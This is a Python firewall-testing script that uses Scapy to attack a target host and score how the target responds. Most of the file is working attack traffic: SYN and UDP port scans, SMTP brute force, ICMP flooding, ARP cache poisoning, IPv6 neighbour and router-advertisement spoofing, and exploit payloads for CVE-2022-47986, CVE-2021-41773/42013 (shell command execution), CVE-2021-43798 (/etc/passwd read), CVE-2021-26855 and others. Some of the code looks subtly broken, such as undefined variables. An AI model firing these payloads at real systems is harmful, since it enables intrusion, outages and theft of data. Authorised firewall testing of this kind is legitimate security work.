#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This module implements tests for firewalls configurations.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

'''
This module implements tests for firewalls configurations.
'''

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This module implements tests for firewalls configurations.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/NetfilterRules"

copyright = """
NetfilterRules  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = []

from scapy.layers.http import *
from scapy.all import *
from time import sleep
from random import randint
from threading import Thread
from socket import socket, AF_INET6
from smtplib import SMTP, SMTPException
from binascii import hexlify, unhexlify
from sys import argv, stderr, exit, executable

from PythonToolsKit.PrintF import printf, ProgressBar
from PythonToolsKit.ScapyTools import get_gateway_route, ScapyArguments
ProgressBar.size = 80

from logging import getLogger
getLogger("scapy.runtime").setLevel(logging.ERROR)

if len(argv) != 4:
    print("USAGES:", executable, argv[0], "interface targetIPv4 targetIPv6", file=stderr)
    exit(1)

_, interface, destination, destinationv6 = argv
score = 0
max_score = 0

interface = ScapyArguments().parse_args(['-i', interface]).iface

send = partial(send, verbose=0, iface=interface)
sr1 = partial(sr1, verbose=0, iface=interface, timeout=2)
arping = partial(arping, verbose=0, iface=interface)
TCP_client.tcplink = partial(TCP_client.tcplink, iface=interface)


def ipv6_link_local_from_mac(mac: str) -> str:
    """
    This function returns the IPv6 link local address based on the MAC address.

    >>> ipv6_link_local_from_mac('0A:00:27:00:00:12')
    'fe80::0800:27ff:fe00:0012'
    >>> ipv6_link_local_from_mac('0a 00 27 00 00 12')
    'fe80::0800:27ff:fe00:0012'
    >>> ipv6_link_local_from_mac('0A-00-27-00-00-12')
    'fe80::0800:27ff:fe00:0012'
    >>> ipv6_link_local_from_mac('0A0027000012')
    'fe80::0800:27ff:fe00:0012'
    >>> 
    """

    mac = unhexlify(mac.replace('-', '').replace(' ', '').replace(':', ''))
    return "fe80::" + hexlify((mac[0] ^ 0b00000010).to_bytes() + mac[1:3] + b"\xff\xfe" + mac[3:], b":", 2).decode()

def mac_from_ipv6_link_layer(ipv6: str):
    '''
    This function returns the IPv6 link local address based on the MAC address.

    >>> mac_from_ipv6_link_layer('fe80::0800:27ff:fe00:0012')
    '0a:00:27:00:00:12'
    >>> mac_from_ipv6_link_layer('')
    Traceback (most recent call last):
        ...
    ValueError: Address: '' is not a valid IPv6 link local address.
    >>> mac_from_ipv6_link_layer('fe80:')
    Traceback (most recent call last):
        ...
    ValueError: Address: 'fe80:' is not a valid IPv6 link local address.
    >>> mac_from_ipv6_link_layer('fe80::0800:2700:fe00:0012')
    Traceback (most recent call last):
        ...
    ValueError: Address: 'fe80::0800:2700:fe00:0012' doesn't map any MAC address.
    >>> mac_from_ipv6_link_layer('fe80::0800:27ff:0000:0012')
    Traceback (most recent call last):
        ...
    ValueError: Address: 'fe80::0800:27ff:0000:0012' doesn't map any MAC address.
    >>> 
    '''

    if not ipv6.startswith('fe80:'):
        raise ValueError(f'Address: {ipv6!r} is not a valid IPv6 link local address.')

    data = ipv6.rsplit(':', 4)

    if len(data) != 5:
        raise ValueError(f'Address: {ipv6!r} is not a valid IPv6 link local address.')

    mac = unhexlify("".join(data[-4:]))

    if mac[3] != 255 or mac[4] != 254:
        raise ValueError(f'Address: {ipv6!r} doesn\'t map any MAC address.')

    return hexlify((mac[0] ^ 0b00000010).to_bytes() + mac[1:3] + mac[5:], b":").decode()


def test_tcp_port_scan():
    global max_score, score
    # for a in range(100):
    #     printf("Test SYN scan (100 SYN packets)", "INFO", round(a * 100 / 100), oneline_progress=True)
    #     send(IP(dst=destination)/TCP(dport=randint(0, 65535)))
    #     send(IPv6(dst=destinationv6)/TCP(dport=randint(0, 65535)))
    # if sr1(IP(dst=destination)/TCP(dport=randint(0, 65535)), timeout=1) is not None:
    printf("Test SYN scan (100 SYN packets / IPv4)", "INFO", 1, oneline_progress=True)
    send([IP(dst=destination)/TCP(dport=RandShort())] * 100)
    s = socket()
    max_score += 15
    try:
        s.connect((destination, 22))
    except TimeoutError:
        printf("Port scan blocked (SYN scan / IPv4)", pourcent=98)
        score += 15
    except ConnectionResetError:
        printf("Port scan probably blocked (SYN scan / IPv4)", pourcent=98)
        score += 7
    else:
        printf("Port scan not blocked (SYN scan / IPv4)", "NOK", 98)

    printf("Test SYN scan (100 SYN packets / IPv6)", "INFO", 1, oneline_progress=True)
    send([IPv6(dst=destinationv6)/TCP(dport=RandShort())] * 100)
    s = socket(AF_INET6)
    max_score += 15
    try:
        s.connect((destinationv6, 22))
    except TimeoutError:
        printf("Port scan blocked (SYN scan / IPv6)", pourcent=100)
        score += 15
    except ConnectionResetError:
        printf("Port scan probably blocked (SYN scan / IPv6)", pourcent=100)
        score += 7
    else:
        printf("Port scan not blocked (SYN scan / IPv6)", "NOK", 100)

    for a in range(60):
        printf("Please wait, bypassing SYN scan protection...", "INFO", round(a * 100 / 60), oneline_progress=True)
        sleep(1)

def send_SMTP_connection():
    global max_score, score
    try:
        with SMTP(destination, timeout=1) as server:
            server.login("user", "pa55word")
    except (SMTPException, TimeoutError, ConnectionResetError):
        pass
    try:
        with SMTP(destinationv6, timeout=1) as server:
            server.login("user", "pa55word")
    except (SMTPException, TimeoutError, ConnectionResetError):
        pass

def wait_for_blacklist_bypass(time: int):
    for a in range(time):
        printf("Please wait, bypassing blacklist...", "INFO", round(a * 100 / 60), oneline_progress=True)
        sleep(1)

def test_bruteforce_attack():
    global max_score, score
    max_score += 20
    for a in range(500):
        printf("Test bruteforce (2x500 authentication SMTP on IPv4 and IPv6)", "INFO", round(a * 100 / 500), oneline_progress=True)
        Thread(target=send_SMTP_connection).start()
        if a and not a % 10:
            sleep(1)
    wait_for_blacklist_bypass(100)
    try:
        with SMTP(destination, timeout=5) as server:
            server.login("user", "pa55word")
    except TimeoutError:
        printf("Bruteforce blocked (IPv4)", pourcent=100)
        score += 20
    except (ConnectionResetError, ConnectionRefusedError):
        printf("Bruteforce probably blocked (IPv4)", pourcent=100)
        score += 10
    except (SMTPException):
        printf("Bruteforce not blocked (IPv4)", "NOK", pourcent=100)
    else:
        printf("Bruteforce not blocked (IPv4)", "NOK", pourcent=100)

    max_score += 20
    try:
        with SMTP(destinationv6, timeout=5) as server:
            server.login("user", "pa55word")
    except TimeoutError:
        printf("Bruteforce blocked (IPv6)", pourcent=100)
        score += 20
    except (ConnectionResetError, ConnectionRefusedError):
        printf("Bruteforce probably blocked (IPv6)", pourcent=100)
        score += 10
    except (SMTPException):
        printf("Bruteforce not blocked (IPv6)", "NOK", pourcent=100)
    else:
        printf("Bruteforce not blocked (IPv6)", "NOK", pourcent=100)

def test_invalid_tcp_packet():
    global max_score, score
    for (type, address, version, opt) in ((IP, destination, "4", {"len": 65}), (IPv6, destinationv6, "6", {"plen": 65})):
        max_score += 6
        response = sr1(type(dst=address, **opt)/TCP(dport=22)/Raw(b'a' * 65535))
        if response is None:
            printf(f"Invalid TCP packet size blocked (IPv{version})", pourcent=33)
            score += 2
        elif response.haslayer(TCP) and "R" in responsep[TCP].flags:
            printf(f"Invalid TCP packet size probably blocked (IPv{version})", pourcent=33)
            score += 1
        else:
            printf(f"Invalid TCP packet size probably not blocked (IPv{version})", "NOK", 33)

        response = sr1(type(dst=address)/TCP(dport=22, flags=7))
        if response is None:
            printf(f"Invalid TCP packet flags blocked (IPv{version})", pourcent=66)
            score += 2
        elif response.haslayer(TCP) and "R" in responsep[TCP].flags:
            printf(f"Invalid TCP packet flags probably blocked (IPv{version})", pourcent=66)
            score += 1
        else:
            printf(f"Invalid TCP packet flags probably not blocked (IPv{version})", "NOK", 66)

        response = sr1(type(dst=address, **opt)/TCP(dport=22, flags='P')/Raw(b'a' * 50))
        if response is None:
            printf(f"New TCP session with invalid flags blocked (IPv{version})", pourcent=99)
            score += 2
        elif response.haslayer(TCP) and "R" in responsep[TCP].flags:
            printf(f"New TCP session with invalid flags probably blocked (IPv{version})", pourcent=99)
            score += 1
        else:
            printf(f"New TCP session with invalid flags probably not blocked (IPv{version})", "NOK", 99)

def test_udp_port_scan():
    global max_score, score
    max_score += 10
    # for a in range(100):
    #     printf("Test UDP scan (100 UDP packets)", "INFO", round(a * 100 / 100), oneline_progress=True)
    #     send(IP(dst=destination)/UDP(dport=randint(0, 65535)))
    #     send(IPv6(dst=destinationv6)/UDP(dport=randint(0, 65535)))

    printf("Test UDP scan (100 UDP packets / IPv4)", "INFO", 1, oneline_progress=True)
    send([IP(dst=destination)/UDP(dport=RandShort())] * 100)
    response = sr1(IP(dst=destination)/UDP(dport=53), timeout=1)
    if response is None:
        printf("Port scan blocked (UDP scan / IPv4)", pourcent=50)
        score += 10
    elif response.haslayer(ICMP):
        printf("Port scan probably blocked (UDP scan/ IPv4)", pourcent=50)
        score += 5
    else:
        printf("Port scan not blocked (UDP scan/ IPv4)", "NOK", 100)

    max_score += 10
    printf("Test UDP scan (100 UDP packets / IPv6)", "INFO", 51, oneline_progress=True)
    send([IPv6(dst=destinationv6)/UDP(dport=RandShort())] * 100)
    response = sr1(IPv6(dst=destinationv6)/UDP(dport=53), timeout=1)
    if response is None:
        printf("Port scan blocked (UDP scan/ IPv6)", pourcent=100)
        score += 10
    elif response.haslayer(ICMP):
        printf("Port scan probably blocked (UDP scan/ IPv6)", pourcent=100)
        score += 5
    else:
        printf("Port scan not blocked (UDP scan)", "NOK", 100)

def test_icmp_flood():
    global max_score, score
    max_score += 7
    # for a in range(300):
    #     printf("Test ICMP flood (300 ICMP packets)", "INFO", round(a * 100 / 300), oneline_progress=True)
    #     send(IP(dst=destination)/ICMP())
    #     send(IPv6(dst=destinationv6)/ICMPv6EchoRequest())

    printf("Test ICMP flood (300 ICMP packets / IPv4)", "INFO", 1, oneline_progress=True)
    send([IP(dst=destination)/ICMP()] * 100)
    response = sr1(IP(dst=destination)/ICMP(), timeout=1)
    if response is None:
        printf("ICMP flood blocked (IPv4)", pourcent=50)
        score += 7
    else:
        printf("ICMP flood blocked (IPv4)", "NOK", 50)
        
    max_score += 7
    printf("Test ICMP flood (300 ICMP packets / IPv6)", "INFO", 51, oneline_progress=True)
    send([IPv6(dst=destinationv6)/ICMPv6EchoRequest()] * 100)
    response = sr1(IPv6(dst=destinationv6)/ICMPv6EchoRequest(), timeout=1)
    if response is None:
        printf("ICMP flood blocked (IPv6)", pourcent=100)
        score += 7
    else:
        printf("ICMP flood blocked (IPv6)", "NOK", 100)

def test_invalid_packet():
    global max_score, score
    max_score += 5
    response = sr1(IP(dst=destination)/Raw(b'a' * 8), timeout=1)
    if response is None:
        printf("Invalid packets are blocked (IPv4)", pourcent=50)
        score += 5
    else:
        printf("Invalid packets are not blocked (IPv4)", "NOK", 50)

    max_score += 5
    response = sr1(IPv6(dst=destinationv6)/Raw(b'a' * 8), timeout=1)
    if response is None:
        printf("Invalid packets are blocked (IPv6)", pourcent=100)
        score += 5
    else:
        printf("Invalid packets are not blocked (IPv6)", "NOK", 100)

def test_arp():
    global max_score, score
    for route in conf.route.routes:
        if route[2] != "0.0.0.0":
            gateway = route[2]
            break
    else:
        gateway = '0.0.0.0'

    detect_mim = False
    def mim_detection(*args):
        global max_score, detect_mim
        detect_mim = True

    sniffer = AsyncSniffer(lfilter=lambda x: x.haslayer(IP) and x[IP].src == destination and x[IP].dst == gateway, prn=mim_detection, iface=interface)
    sniffer.start()

    mac = getmacbyip(destination)
    max_score += 15
    if mac is None:
        printf("Destination doesn't respond to ARP query", pourcent=5)
        score += 15

    ans, unans = arping(str(get_gateway_route().network))
    has_answer = False
    for an in ans:
        print(ans.summary())
        if an.answer.haslayer(ARP) and an.answer[ARP].psrc == destination:
            printf("Get an ARP ping response from the target", "NOK", 15)
            has_answer = True

    max_score += 10
    if not has_answer:
        printf("Destination doesn't respond to ARP ping", pourcent=15)
        score += 10

    # arpcachepoison(destination, gateway)
    # arp_mitm(destination, gateway)

    for a in range(120):
        send(ARP(psrc=destination, pdst=gateway))
        sleep(1)
        printf("ARP cache poisonning", "INFO", round(15 + (85 * a / 120)), oneline_progress=True)

    sniffer.stop()

    max_score += 20
    if detect_mim:
        printf("Target is vulnerable to ARP cache poisonning...", "NOK", 100)
    else:
        printf("Target is probably not vulnerable to ARP cache poisonning...", pourcent=100)
        score += 20

def ipv6_mitm():
    for route in conf.route.routes:
        if route[2] != "::":
            gateway = route[2]
            break
    else:
        gateway = '::'

    max_score += 10
    mac = sr1(IPv6(dst='ff02::1')/ICMPv6ND_NS(tgt=destinationv6)/ICMPv6NDOptSrcLLAddr(lladdr=interface.mac), count=5, timeout=5) or getmacbyip6(destinationv6)

    if mac and not isinstance(mac, str):
        mac = mac[Ether].src
    
    if mac:
        printf("Target answer his MAC address to anyone who ask...", "NOK", 5)
    else:
        printf("Target doesn't respond to MAC query on IPv6", pourcent=5)
        score += 10

    answer_scanv6 = False
    def answer_scan_detection(*args):
        global answer_scanv6
        answer_scanv6 = True

    sniffer = AsyncSniffer(lfilter=lambda x: x.haslayer(IPv6) and mac == x[Ether].src and x[IPv6].src.startswith('2001:db8:dead:beef::'), prn=answer_scan_detection, iface=interface)
    sniffer.start()

    for a in range(120):
        printf("Send neighbor router advertisements and multicast pingv6 packets", "INFO", round(5 + (49 * a / 120)), oneline_progress=True)
        send(IPv6() / ICMPv6ND_RA() / ICMPv6NDOptPrefixInfo(prefix='2001:db8:dead:beef::', prefixlen=64) / ICMPv6NDOptSrcLLAddr(lladdr="33:33:00:00:00:01"))
        send(IPv6(dst='ff02::1')/ICMPv6EchoRequest())

    sniffer.stop()

    max_score += 10
    if answer_scanv6:
        printf("Destination doesn't respond to IPv6 query", pourcent=5)
        score += 10

    mim_detection = False
    def answer_mim_detection(*args):
        global mim_detection
        mim_detection = True

    sniffer = AsyncSniffer(lfilter=lambda x: x.haslayer(IPv6) and x[IPv6].dst == gateway and x[Ether].dst == interface.mac, prn=answer_mim_detection, iface=interface)
    sniffer.start()

    for a in range(120):
        printf("MIMv6 attack...", "INFO", round(54 + (46 * a / 120)), oneline_progress=True)
        send(IPv6(src=gateway, dst=destinationv6) / ICMPv6ND_NS(tgt=destinationv6) / ICMPv6NDOptSrcLLAddr(lladdr=interface.mac))
        send(IPv6(src=gateway, dst=destinationv6) / ICMPv6ND_NA(R=0, tgt=gateway) / ICMPv6NDOptDstLLAddr(lladdr=interface.mac))

    sniffer.stop()

    max_score += 20
    if mim_detection:
        printf("Target is vulnerable to MIMv6", pourcent=5)
        score += 20

def test_exploits():
    global max_score, score
    max_score += 20
    printf("Send exploit for CVE-2005-0048 (Windows XP/2000/2003 DOS/RCE attack).", "INFO", 1)
    send(IP(dst=destination, options="\x02\x27"+"X"*38) / TCP())
    response = sr1(IP(dst=destination) / TCP(), timeout=5)
    if response is None:
        printf("No response after exploitation of CVE-2005-0048")
        score += 20
    else:
        printf("Get response after exploitation of CVE-2005-0048", "NOK")

    max_score += 20
    printf("Send exploit for CVE-2017-12999 (tcpdump IS-IS parser < 4.9.2 buffer over-read attack).", "INFO", 1)
    send(IP(dst=destination) / GRE(proto=254) / '\x83\x1b \x01\x06\x12\0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x01\x07 \x00\x00')
    response = sr1(IP(dst=destination) / TCP(), timeout=5)
    if response is None:
        printf("No response after exploitation of CVE-2017-12999")
        score += 20
    else:
        printf("Get response after exploitation of CVE-2017-12999", "NOK")

    printf("Send exploit for CVE-2022-47986 (YAML deserialization that causes a RCE in IBM Aspera Faspex (before 4.4.2)).", "INFO", 1)
    load_layer("http")
    max_score += 20
    a = TCP_client.tcplink(HTTP, destination, 80)
    answer = a.sr1(HTTP()/HTTPRequest(
        Method=b'POST',
        Path=b'/aspera/faspex/package_relay/relay_package',
        Accept_Encoding=b'gzip, deflate',
        Cache_Control=b'no-cache',
        Connection=b'keep-alive',
        Host=destination.encode(),
        Content_Type=b"application/json",
        Pragma=b'no-cache'
    ) / Raw(b'{"package_file_list": ["/"], "external_emails": "\\n---\\n- !ruby/object:Gem::Installer\\n    i: x\\n- !ruby/object:Gem::SpecFetcher\\n    i: y\\n- !ruby/object:Gem::Requirement\\n  requirements:\\n    !ruby/object:Gem::Package::TarReader\\n    io: &1 !ruby/object:Net::BufferedIO\\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\\n         read: 0\\n         header: \\"pew\\"\\n      debug_output: &1 !ruby/object:Net::WriteAdapter\\n         socket: &1 !ruby/object:PrettyPrint\\n             output: !ruby/object:Net::WriteAdapter\\n                 socket: &1 !ruby/module \\"Kernel\\"\\n                 method_id: :eval\\n             newline: \\"throw `uname -a`\\"\\n             buffer: {}\\n             group_stack:\\n              - !ruby/object:PrettyPrint::Group\\n                break: true\\n         method_id: :breakable\\n", "package_name": "assetnote_pack", "package_note": "hello from assetnote team", "original_sender_name": "assetnote", "package_uuid": "d7cb6601-6db9-43aa-8e6b-dfb4768647ec", "metadata_human_readable": "Yes", "forward": "pew", "metadata_json": "{}", "delivery_uuid": "d7cb6601-6db9-43aa-8e6b-dfb4768647ec", "delivery_sender_name": "assetnote", "delivery_title": "TEST", "delivery_note": "TEST", "delete_after_download": true, "delete_after_download_condition": "IDK"}'), timeout=2, verbose=0)
    a.close()
    if response is None:
        printf("No response after exploitation of CVE-2022-47986")
        score += 20
    else:
        printf("Get response after exploitation of CVE-2022-47986", "NOK")

    printf("Send exploit for CVE-2021-43798 (directory traversal vulnerability on Grafana > 8.0.0-beta1 and < 8.3.0).", "INFO", 1)
    max_score += 20
    a = TCP_client.tcplink(HTTP, destination, 80)
    answer = a.sr1(HTTP()/HTTPRequest(
        Path=b'/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
        Accept_Encoding=b'gzip, deflate',
        Cache_Control=b'no-cache',
        Connection=b'keep-alive',
        Host=destination.encode(),
        Pragma=b'no-cache'
    ), timeout=2, verbose=0)
    a.close()
    if response is None:
        printf("No response after exploitation of CVE-2021-43798")
        score += 20
    else:
        printf("Get response after exploitation of CVE-2021-43798", "NOK")

    printf("Send exploit for CVE-2021-31166 (HTTP Protocol Stack Remote Code Execution Vulnerability in IIS).", "INFO", 1)
    max_score += 20
    a = TCP_client.tcplink(HTTP, destination, 80)
    answer = a.sr1(HTTP()/HTTPRequest(
        Accept_Encoding=b'doar-e, ftw, imo, ,',
        Cache_Control=b'no-cache',
        Connection=b'keep-alive',
        Host=destination.encode(),
        Pragma=b'no-cache'
    ), timeout=2, verbose=0)
    a.close()
    if response is None:
        printf("No response after exploitation of CVE-2021-31166")
        score += 20
    else:
        printf("Get response after exploitation of CVE-2021-31166", "NOK")

    printf("Send exploit for CVE-2021-42013 (Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)).", "INFO", 1)
    max_score += 20
    a = TCP_client.tcplink(HTTP, destination, 80)
    answer = a.sr1(HTTP()/HTTPRequest(
        Method=b'POST',
        Path=b'/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh',
        Accept_Encoding=b'gzip, deflate',
        Cache_Control=b'no-cache',
        Connection=b'keep-alive',
        Host=destination.encode(),
        Pragma=b'no-cache'
    ) / Raw(b'echo Content-Type: text/plain; echo; id'), timeout=2, verbose=0)
    a.close()
    if response is None:
        printf("No response after exploitation of CVE-2021-42013")
        score += 20
    else:
        printf("Get response after exploitation of CVE-2021-42013", "NOK")

    printf("Send exploit for CVE-2021-41773 (Apache HTTP Server 2.4.49 - Path Traversal).", "INFO", 1)
    max_score += 20
    a = TCP_client.tcplink(HTTP, destination, 80)
    answer = a.sr1(HTTP()/HTTPRequest(
        Method=b'POST',
        Path=b'/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
        Accept_Encoding=b'gzip, deflate',
        Cache_Control=b'no-cache',
        Connection=b'keep-alive',
        Host=destination.encode(),
        Pragma=b'no-cache'
    ) / Raw(b'echo Content-Type: text/plain; echo; id'), timeout=2, verbose=0)
    a.close()
    if response is None:
        printf("No response after exploitation of CVE-2021-41773")
        score += 20
    else:
        printf("Get response after exploitation of CVE-2021-41773", "NOK")

    printf("Send exploit for CVE-2021-21985 (vSphere Client remote code execution vulnerability).", "INFO", 1)
    max_score += 20
    a = TCP_client.tcplink(HTTP, destination, 80)
    answer = a.sr1(HTTP()/HTTPRequest(
        Method=b'POST',
        Path=b'/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData',
        Accept_Encoding=b'gzip, deflate',
        Cache_Control=b'no-cache',
        Connection=b'keep-alive',
        Host=destination.encode(),
        Content_Type=b"application/json",
        Pragma=b'no-cache'
    ) / Raw(b'{"methodInput": [{"type": "ClusterComputeResource", "value": null, "serverGuid": null}]}'), timeout=2, verbose=0)
    a.close()
    if response is None:
        printf("No response after exploitation of CVE-2021-21985")
        score += 20
    else:
        printf("Get response after exploitation of CVE-2021-21985", "NOK")

    printf("Send exploit for CVE-2021-26855 (Microsoft Exchange Server Remote Code Execution Vulnerability).", "INFO", 1)
    max_score += 20
    a = TCP_client.tcplink(HTTP, destination, 80)
    answer = a.sr1(HTTP()/HTTPRequest(
        Path=b'/owa/auth/x.js',
        Cookie=b'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;',
        Accept_Encoding=b'gzip, deflate',
        Cache_Control=b'no-cache',
        Connection=b'keep-alive',
        Host=destination.encode(),
        Pragma=b'no-cache'
    ), timeout=2, verbose=0)
    a.close()
    if response is None:
        printf("No response after exploitation of CVE-2021-26855")
        score += 20
    else:
        printf("Get response after exploitation of CVE-2021-26855", "NOK")


if __name__ == "__main__":
    test_exploits()
    test_invalid_packet()
    test_invalid_tcp_packet()
    test_arp()
    ipv6_mitm()
    wait_for_blacklist_bypass(60)
    test_bruteforce_attack()
    wait_for_blacklist_bypass(60)
    test_tcp_port_scan()
    wait_for_blacklist_bypass(60)
    test_udp_port_scan()
    wait_for_blacklist_bypass(60)
    test_icmp_flood()
    printf(f"Score = {score}/{max_score}")